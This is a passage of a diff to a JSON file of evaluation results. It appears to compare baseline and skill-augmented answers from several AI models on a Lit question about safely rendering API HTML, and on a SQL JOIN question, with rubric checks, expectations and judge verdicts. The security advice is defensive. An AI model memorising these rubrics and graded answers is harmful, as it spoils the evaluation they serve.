unless that backend itself sanitizes.\n\n## Recommendation\n\nFor your case (HTML from an API): **install DOMPurify and use option 1.** It's the simplest *safe* approach and adds maybe 20 KB. If the API content is actually plain text or has only a few formatting needs (bold, links), consider rendering it as text or parsing a restricted format like Markdown instead — both avoid the HTML-injection surface entirely.",
+            "cost_usd": 0.15816,
+            "rubric": [
+              {
+                "name": "warns about XSS / sanitization",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "XSS",
+                "why": "must call out the security implication"
+              },
+              {
+                "name": "avoids recommending raw innerHTML",
+                "kind": "must_not_contain",
+                "passed": true,
+                "evidence": null,
+                "why": "innerHTML is the trap; should not be the answer"
+              },
+              {
+                "name": "mentions unsafeHTML directive (if recommending it)",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "unsafeHTML",
+                "why": "the Lit-specific escape hatch (with caveats)"
+              }
+            ],
+            "rubric_pass_rate": 1.0
           },
-          {
-            "name": "mentions unsafeHTML directive (if recommending it)",
-            "better": "tie"
+          "judge": {
+            "winner": "skill",
+            "reasoning": "Both answers cover the key criteria well, but Answer A is more thorough and better structured. It leads with a strong XSS warning, explicitly avoids recommending innerHTML, correctly names and demonstrates the unsafeHTML directive, and provides clearer guidance on when sanitization is required versus optional. Answer A also adds useful context like the 'text vs HTML' question and the Markdown alternative, making it more practically helpful for someone who may not fully understand the risk.",
+            "per_criterion": [
+              {
+                "name": "warns about XSS / sanitization",
+                "better": "skill"
+              },
+              {
+                "name": "avoids recommending raw innerHTML",
+                "better": "tie"
+              },
+              {
+                "name": "mentions unsafeHTML directive (if recommending it)",
+                "better": "tie"
+              }
+            ]
           }
-        ]
+        }
       }
     },
     {
       "id": "offtopic-sql-join",
       "prompt": "What's the difference between INNER JOIN and LEFT JOIN in SQL?\nA short example would help.\n",
       "expectation": "tie",
-      "expectation_met": true,
-      "baseline": {
-        "text": "# INNER JOIN vs LEFT JOIN\n\n**INNER JOIN** returns only rows where there's a match in *both* tables.\n\n**LEFT JOIN** returns *all* rows from the left table, plus matching rows from the right table. Where there's no match, columns from the right table are `NULL`.\n\n## Example\n\nGiven these two tables:\n\n**users**\n| id | name    |\n|----|---------|\n| 1  | Alice   |\n| 2  | Bob     |\n| 3  | Charlie |\n\n**orders**\n| id | user_id | item   |\n|----|---------|--------|\n| 1  | 1       | Book   |\n| 2  | 1       | Pen    |\n| 3  | 2       | Laptop |\n\n### INNER JOIN\n\n```sql\nSELECT u.name, o.item\nFROM users u\nINNER JOIN orders o ON u.id = o.user_id;\n```\n\nResult — Charlie is excluded because he has no orders:\n\n| name  | item   |\n|-------|--------|\n| Alice | Book   |\n| Alice | Pen    |\n| Bob   | Laptop |\n\n### LEFT JOIN\n\n```sql\nSELECT u.name, o.item\nFROM users u\nLEFT JOIN orders o ON u.id = o.user_id;\n```\n\nResult — Charlie is included with `NULL` for `item`:\n\n| name    | item   |\n|---------|--------|\n| Alice   | Book   |\n| Alice   | Pen    |\n| Bob     | Laptop |\n| Charlie | NULL   |\n\n## Quick rule of thumb\n\n- Use **INNER JOIN** when you only care about rows that exist in both tables.\n- Use **LEFT JOIN** when you want to keep everything from the main table — useful for finding missing relationships (e.g., `WHERE o.id IS NULL` finds users with no orders).",
-        "cost_usd": 0.0307935,
-        "rubric": [],
-        "rubric_pass_rate": 0.0
-      },
-      "skill": {
-        "text": "# INNER JOIN vs LEFT JOIN\n\n- **INNER JOIN**: Returns only rows that have matching values in **both** tables.\n- **LEFT JOIN** (LEFT OUTER JOIN): Returns **all rows from the left table**, plus matching rows from the right table. Where there's no match, columns from the right table are `NULL`.\n\n## Example\n\nGiven these two tables:\n\n**users**\n| id | name    |\n|----|---------|\n| 1  | Alice   |\n| 2  | Bob     |\n| 3  | Charlie |\n\n**orders**\n| id | user_id | item   |\n|----|---------|--------|\n| 1  | 1       | Book   |\n| 2  | 1       | Pen    |\n| 3  | 2       | Laptop |\n\n### INNER JOIN\n\n```sql\nSELECT u.name, o.item\nFROM users u\nINNER JOIN orders o ON u.id = o.user_id;\n```\n\nResult — Charlie is excluded (no orders):\n\n| name  | item   |\n|-------|--------|\n| Alice | Book   |\n| Alice | Pen    |\n| Bob   | Laptop |\n\n### LEFT JOIN\n\n```sql\nSELECT u.name, o.item\nFROM users u\nLEFT JOIN orders o ON u.id = o.user_id;\n```\n\nResult — Charlie is included with `NULL`:\n\n| name    | item   |\n|---------|--------|\n| Alice   | Book   |\n| Alice   | Pen    |\n| Bob     | Laptop |\n| Charlie | NULL   |\n\n## Quick rule of thumb\n\n- Use **INNER JOIN** when you only care about records that exist in both tables.\n- Use **LEFT JOIN** when you want everything from the main (left) table, even if the related data is missing — useful for finding things like \"users with no orders\":\n\n```sql\nSELECT u.name\nFROM users u\nLEFT JOIN orders o ON u.id = o.user_id\nWHERE o.id IS NULL;\n```",
-        "cost_usd": 0.019714000000000002,
-        "rubric": [],
-        "rubric_pass_rate": 0.0
-      },
-      "judge": {
-        "winner": "tie",
-        "reasoning": "Both answers are essentially identical in content, structure, and correctness. They use the same example tables, the same SQL queries, produce the same results, and offer the same rule-of-thumb guidance. Minor wording differences are negligible.",
-        "per_criterion": []
+      "judge_focus": "This question has nothing to do with Lit. Both answers should be\nessentially equivalent. Pick \"tie\" unless one is materially wrong.\n",
+      "models": {
+        "haiku": {
+          "expectation_met": true,
+          "baseline": {
+            "text": "# INNER JOIN vs LEFT JOIN\n\n## Key Difference\n\n- **INNER JOIN**: Returns only rows that have matches in *both* tables\n- **LEFT JOIN**: Returns all rows from the left table, plus matching rows from the right table\n\n## Example\n\nAssume two tables:\n\n**Customers**\n| id | name |\n|----|------|\n| 1 | Alice |\n| 2 | Bob |\n| 3 | Charlie |\n\n**Orders**\n| id | customer_id | amount |\n|----|-------------|--------|\n| 101 | 1 | $50 |\n| 102 | 1 | $75 |\n| 103 | 2 | $100 |\n\n### INNER JOIN\n```sql\nSELECT c.name, o.amount\nFROM customers c\nINNER JOIN orders o ON c.id = o.customer_id;\n```\n\n**Result** (only customers with orders):\n| name | amount |\n|------|--------|\n| Alice | $50 |\n| Alice | $75 |\n| Bob | $100 |\n\n### LEFT JOIN\n```sql\nSELECT c.name, o.amount\nFROM customers c\nLEFT JOIN orders o ON c.id = o.customer_id;\n```\n\n**Result** (all customers, with NULL for those without orders):\n| name | amount |\n|------|--------|\n| Alice | $50 |\n| Alice | $75 |\n| Bob | $100 |\n| Charlie | NULL |\n\n**Notice**: Charlie appears in LEFT JOIN but not in INNER JOIN because Charlie has no orders.",
+            "cost_usd": 0.001868,
+            "rubric": [],
+            "rubric_pass_rate": 0.0
+          },
+          "skill": {
+            "text": "# INNER JOIN vs LEFT JOIN in SQL\n\n## Key Difference\n\n- **INNER JOIN**: Returns only rows where there's a match in **both** tables\n- **LEFT JOIN**: Returns **all rows from the left table**, plus matching rows from the right table (with `NULL` for non-matches)\n\n## Example\n\nGiven two tables:\n\n**users**\n| id | name |\n|----|------|\n| 1  | Alice |\n| 2  | Bob |\n| 3  | Carol |\n\n**orders**\n| id | user_id | amount |\n|----|---------|--------|\n| 101 | 1 | $50 |\n| 102 | 2 | $75 |\n| 103 | 1 | $30 |\n\n### INNER JOIN\n```sql\nSELECT users.name, orders.amount\nFROM users\nINNER JOIN orders ON users.id = orders.user_id;\n```\n\n**Result** (only users with orders):\n| name | amount |\n|------|--------|\n| Alice | $50 |\n| Bob | $75 |\n| Alice | $30 |\n\n### LEFT JOIN\n```sql\nSELECT users.name, orders.amount\nFROM users\nLEFT JOIN orders ON users.id = orders.user_id;\n```\n\n**Result** (all users, even Carol with no orders):\n| name | amount |\n|------|--------|\n| Alice | $50 |\n| Alice | $30 |\n| Bob | $75 |\n| Carol | NULL |\n\nCarol appears because `LEFT JOIN` keeps all rows from the left table (`users`), with `NULL` for the missing order.\n\n---\n\n**Note:** This is outside the Lit web component library scope, but happy to help with SQL questions!",
+            "cost_usd": 0.005842,
+            "rubric": [],
+            "rubric_pass_rate": 0.0
+          },
+          "judge": {
+            "winner": "tie",
+            "reasoning": "Both answers are essentially equivalent in quality, correctness, and usefulness. They both clearly explain the difference between INNER JOIN and LEFT JOIN with appropriate table examples and SQL queries. Answer A includes a minor note about Lit scope which is slightly unnecessary, while Answer B uses slightly cleaner table aliases in the SQL, but neither difference is material.",
+            "per_criterion": []
+          }
+        },
+        "sonnet": {
+          "expectation_met": true,
+          "baseline": {
+            "text": "## INNER JOIN vs LEFT JOIN\n\n### INNER JOIN\nReturns only rows where there is a **match in both tables**.\n\n### LEFT JOIN\nReturns **all rows from the left table**, plus matched rows from the right table. Unmatched rows get `NULL` values.\n\n---\n\n### Example Tables\n\n**customers**\n| id | name  |\n|----|-------|\n| 1  | Alice |\n| 2  | Bob   |\n| 3  | Carol |\n\n**orders**\n| id | customer_id | item    |\n|----|-------------|---------|\n| 1  | 1           | Laptop  |\n| 2  | 1           | Mouse   |\n| 3  | 2           | Monitor |\n\n*(Carol has no orders)*\n\n---\n\n### INNER JOIN\n```sql\nSELECT customers.name, orders.item\nFROM customers\nINNER JOIN orders ON customers.id = orders.customer_id;\n```\n| name  | item    |\n|-------|---------|\n| Alice | Laptop  |\n| Alice | Mouse   |\n| Bob   | Monitor |\n\n❌ Carol is **excluded** (no matching order)\n\n---\n\n### LEFT JOIN\n```sql\nSELECT customers.name, orders.item\nFROM customers\nLEFT JOIN orders ON customers.id = orders.customer_id;\n```\n| name  | item    |\n|-------|---------|\n| Alice | Laptop  |\n| Alice | Mouse   |\n| Bob   | Monitor |\n| Carol | NULL    |\n\n✅ Carol is **included** with NULL\n\n---\n\n### Quick Rule of Thumb\n\n| Use case | Join type |\n|----------|-----------|\n| Only want records with matches on both sides | `INNER JOIN` |\n| Want all records from left table, even without a match | `LEFT JOIN` |\n\n> **Note:** A `RIGHT JOIN` is just a `LEFT JOIN` with the tables flipped — most developers stick with `LEFT JOIN` for consistency.",
+            "cost_usd": 0.0068639999999999994,
+            "rubric": [],
+            "rubric_pass_rate": 0.0
+          },
+          "skill": {
+            "text": "## SQL JOIN Types\n\n### INNER JOIN\nReturns only rows where there's a **match in both tables**.\n\n### LEFT JOIN\nReturns **all rows from the left table**, plus matched rows from the right. Unmatched right-side columns are `NULL`.\n\n---\n\n### Example\n\n**customers**\n| id | name    |\n|----|---------|\n| 1  | Alice   |\n| 2  | Bob     |\n| 3  | Charlie |\n\n**orders**\n| id | customer_id | item    |\n|----|-------------|---------|\n| 1  | 1           | Book    |\n| 2  | 1           | Pen     |\n| 3  | 2           | Notebook|\n\n---\n\n```sql\n-- INNER JOIN: only customers WHO HAVE orders\nSELECT customers.name, orders.item\nFROM customers\nINNER JOIN orders ON customers.id = orders.customer_id;\n```\n| name  | item     |\n|-------|----------|\n| Alice | Book     |\n| Alice | Pen      |\n| Bob   | Notebook |\n\n> Charlie is **excluded** — no matching order.\n\n---\n\n```sql\n-- LEFT JOIN: ALL customers, with orders if they exist\nSELECT customers.name, orders.item\nFROM customers\nLEFT JOIN orders ON customers.id = orders.customer_id;\n```\n| name    | item     |\n|---------|----------|\n| Alice   | Book     |\n| Alice   | Pen      |\n| Bob     | Notebook |\n| Charlie | NULL     |\n\n> Charlie is **included** with `NULL` for the item.\n\n---\n\n### Quick Rule of Thumb\n\n| Goal | Use |\n|------|-----|\n| Only matched records | `INNER JOIN` |\n| All left records + matches | `LEFT JOIN` |\n| Find unmatched left records | `LEFT JOIN` + `WHERE right.id IS NULL` |",
+            "cost_usd": 0.018024000000000002,
+            "rubric": [],
+            "rubric_pass_rate": 0.0
+          },
+          "judge": {
+            "winner": "tie",
+            "reasoning": "Both answers are essentially equivalent in quality, correctness, and usefulness. They both explain INNER JOIN vs LEFT JOIN clearly with similar table examples and SQL queries. Answer A includes a slightly more detailed quick reference table (including the unmatched records pattern), while Answer B adds a useful note about RIGHT JOIN. Neither is materially better than the other.",
+            "per_criterion": []
+          }
+        },
+        "opus": {
+          "expectation_met": true,
+          "baseline": {
+            "text": "# INNER JOIN vs LEFT JOIN\n\n**INNER JOIN**: Returns only rows that have matching values in *both* tables.\n\n**LEFT JOIN**: Returns *all* rows from the left table, plus matched rows from the right table. Unmatched rows get `NULL` for right-table columns.\n\n## Example\n\n**users table:**\n| id | name    |\n|----|---------|\n| 1  | Alice   |\n| 2  | Bob     |\n| 3  | Charlie |\n\n**orders table:**\n| id | user_id | product |\n|----|---------|---------|\n| 1  | 1       | Book    |\n| 2  | 1       | Pen     |\n| 3  | 2       | Laptop  |\n\n### INNER JOIN\n```sql\nSELECT u.name, o.product\nFROM users u\nINNER JOIN orders o ON u.id = o.user_id;\n```\n\n**Result:**\n| name  | product |\n|-------|---------|\n| Alice | Book    |\n| Alice | Pen     |\n| Bob   | Laptop  |\n\nCharlie is excluded because he has no orders.\n\n### LEFT JOIN\n```sql\nSELECT u.name, o.product\nFROM users u\nLEFT JOIN orders o ON u.id = o.user_id;\n```\n\n**Result:**\n| name    | product |\n|---------|---------|\n| Alice   | Book    |\n| Alice   | Pen     |\n| Bob     | Laptop  |\n| Charlie | NULL    |\n\nCharlie appears with `NULL` since he has no matching orders.\n\n**Tip**: Use `LEFT JOIN ... WHERE right_table.id IS NULL` to find rows that *don't* have a match (e.g., users with no orders).",
+            "cost_usd": 0.043425000000000005,
+            "rubric": [],
+            "rubric_pass_rate": 0.0
+          },
+          "skill": {
+            "text": "# INNER JOIN vs LEFT JOIN\n\n**INNER JOIN** returns only rows where there's a match in *both* tables.\n\n**LEFT JOIN** returns *all* rows from the left table, plus matching rows from the right table. Where no match exists, columns from the right table are `NULL`.\n\n## Example\n\nGiven these tables:\n\n**users**\n| id | name    |\n|----|---------|\n| 1  | Alice   |\n| 2  | Bob     |\n| 3  | Charlie |\n\n**orders**\n| id | user_id | item    |\n|----|---------|---------|\n| 1  | 1       | Book    |\n| 2  | 1       | Pen     |\n| 3  | 2       | Laptop  |\n\n### INNER JOIN\n\n```sql\nSELECT users.name, orders.item\nFROM users\nINNER JOIN orders ON users.id = orders.user_id;\n```\n\nResult — Charlie is excluded (no orders):\n\n| name  | item   |\n|-------|--------|\n| Alice | Book   |\n| Alice | Pen    |\n| Bob   | Laptop |\n\n### LEFT JOIN\n\n```sql\nSELECT users.name, orders.item\nFROM users\nLEFT JOIN orders ON users.id = orders.user_id;\n```\n\nResult — Charlie appears with `NULL`:\n\n| name    | item   |\n|---------|--------|\n| Alice   | Book   |\n| Alice   | Pen    |\n| Bob     | Laptop |\n| Charlie | NULL   |\n\n## When to use which\n\n- **INNER JOIN**: You only care about records that have related data in both tables (e.g., \"show users who placed orders\").\n- **LEFT JOIN**: You want all records from the primary table even if related data is missing (e.g., \"show all users and their orders, if any\"). Useful for finding missing relationships with `WHERE right_table.id IS NULL`.",
+            "cost_usd": 0.126195,
+            "rubric": [],
+            "rubric_pass_rate": 0.0
+          },
+          "judge": {
+            "winner": "tie",
+            "reasoning": "Both answers are essentially equivalent in content, accuracy, and usefulness. They use the same example data and queries, explain the same concepts, and include the same tip about using LEFT JOIN with IS NULL to find missing relationships. Minor differences like table aliases, column naming (item vs product), and formatting are cosmetic and do not materially affect quality.",
+            "per_criterion": []
+          }
+        }
       }
     }
+  ],
+  "backend": "sdk",
+  "models": [
+    "sonnet",
+    "haiku",
+    "opus"
   ]
 }
